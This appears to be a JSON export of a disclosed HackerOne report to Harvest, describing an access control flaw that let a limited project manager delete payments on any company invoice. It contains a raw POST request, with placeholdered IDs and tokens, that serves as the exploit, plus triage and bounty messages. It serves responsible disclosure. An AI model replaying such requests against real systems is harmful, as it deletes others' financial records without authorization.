{"id":159393,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTkzOTM=","url":"https://hackerone.com/reports/159393","title":"PM can delete payment of any invoice in company (Access control Issue)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-15T02:06:01.674Z","submitted_at":"2016-08-15T02:06:01.674Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"indoappsec","url":"/indoappsec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":237,"url":"https://hackerone.com/harvest","handle":"harvest","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Harvest","twitter_handle":"","website":"http://getharvest.com","about":"Harvest is a leader in online time tracking and invoicing. Work better, and make smarter decisions for your business."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-09-29T23:03:39.077Z","bug_reporter_agreed_on_going_public_at":"2016-08-30T23:03:21.755Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Team,\n\nDescription :  Project manager(Full Access) have Access to only assigned projects and he will have access to limited Invoices. But Project manager can Delete Payment of Any invoices in the company. The HTTP request Doesn't check whether Project manager have access to the project or not. \n\nHTTP request : \n\nPOST /invoices/[Invoice_ID]/payments/[Payment_ID]HTTP/1.1\nHost: vijaygangani.harvestapp.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://vijaygangani.harvestapp.com/invoices/10392603\nCookie: [Cookie_values]\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 128\n\n_method=delete\u0026authenticity_token=[Oauth_token]\n\nSteps to reproduce : \nIn the above mentioned Request change the Invoice_ID and payment_ID Accordingly and send it to server by the Project manager who doesn't have access to this Invoice . You will see that the Payment will be deleted for that particular Invoice .\n\n\nLet me know if you need detailed Steps or Video poc for this issue.\n\n\nBest Regards !\nVijay Kumar ","vulnerability_information_html":"\u003cp\u003eHi Team,\u003c/p\u003e\n\n\u003cp\u003eDescription :  Project manager(Full Access) have Access to only assigned projects and he will have access to limited Invoices. But Project manager can Delete Payment of Any invoices in the company. The HTTP request Doesn\u0026#39;t check whether Project manager have access to the project or not. \u003c/p\u003e\n\n\u003cp\u003eHTTP request : \u003c/p\u003e\n\n\u003cp\u003ePOST /invoices/[Invoice_ID]/payments/[Payment_ID]HTTP/1.1\u003cbr\u003e\nHost: vijaygangani.harvestapp.com\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\u003cbr\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,\u003cem\u003e/\u003c/em\u003e;q=0.8\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate, br\u003cbr\u003e\nReferer: \u003ca title=\"https://vijaygangani.harvestapp.com/invoices/10392603\" href=\"/redirect?url=https%3A%2F%2Fvijaygangani.harvestapp.com%2Finvoices%2F10392603\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vijaygangani.harvestapp.com/invoices/10392603\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nCookie: [Cookie_values]\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded\u003cbr\u003e\nContent-Length: 128\u003c/p\u003e\n\n\u003cp\u003e_method=delete\u0026amp;authenticity_token=[Oauth_token]\u003c/p\u003e\n\n\u003cp\u003eSteps to reproduce : \u003cbr\u003e\nIn the above mentioned Request change the Invoice_ID and payment_ID Accordingly and send it to server by the Project manager who doesn\u0026#39;t have access to this Invoice . You will see that the Payment will be deleted for that particular Invoice .\u003c/p\u003e\n\n\u003cp\u003eLet me know if you need detailed Steps or Video poc for this issue.\u003c/p\u003e\n\n\u003cp\u003eBest Regards !\u003cbr\u003e\nVijay Kumar \u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-29T23:03:21.846Z","allow_singular_disclosure_after":-134026380.54890558,"singular_disclosure_allowed":true,"vote_count":13,"voters":["thisishrsh","dmatrix","dilawer01","madrobot","vijay_kumar","jens","gopi","jbbbkj","sumit7","nigba","and 3 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1147288,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi again Vijay,\n\nWe also confirmed this bug and we are fixing it.\nWe will get back to you as soon as we can.\n\nBest, \nJorge","markdown_message":"\u003cp\u003eHi again Vijay,\u003c/p\u003e\n\n\u003cp\u003eWe also confirmed this bug and we are fixing it.\u003cbr\u003e\nWe will get back to you as soon as we can.\u003c/p\u003e\n\n\u003cp\u003eBest, \u003cbr\u003e\nJorge\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-23T10:38:55.364Z","updated_at":"2016-08-23T10:38:55.364Z","actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1159999,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi, another one :)\nCould you check if you are able to reproduce it?\n\nThanks!\nJorge","markdown_message":"\u003cp\u003eHi, another one :)\u003cbr\u003e\nCould you check if you are able to reproduce it?\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\nJorge\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-29T15:34:05.743Z","updated_at":"2016-08-29T15:34:05.743Z","actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"indoappsec","url":"/indoappsec"},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1162664,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping make Harvest more secure!","markdown_message":"\u003cp\u003eThanks for helping make Harvest more secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-08-30T16:48:46.931Z","updated_at":"2016-08-30T16:48:46.931Z","actor":{"url":"/harvest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Harvest"}},"bounty_amount":"100.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"harvest","collaborator":{"username":"indoappsec","url":"/indoappsec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1163625,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-30T23:03:21.791Z","updated_at":"2016-08-30T23:03:21.791Z","first_to_agree":true,"actor":{"username":"indoappsec","cleared":true,"url":"/indoappsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QUAjqUf576QNBhxg691WB8YG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1223856,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-29T15:54:23.278Z","updated_at":"2016-09-29T15:54:23.278Z","additional_data":{"old_title":"Project manager of limited access to Invoices can Delete payment of any invoice in company(Access control Issue)","new_title":"PM can delete payment of any invoice in company (Access control Issue)"},"actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1224819,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-09-29T23:03:39.115Z","updated_at":"2016-09-29T23:03:39.115Z","actor":{"url":"/harvest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Harvest"}},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}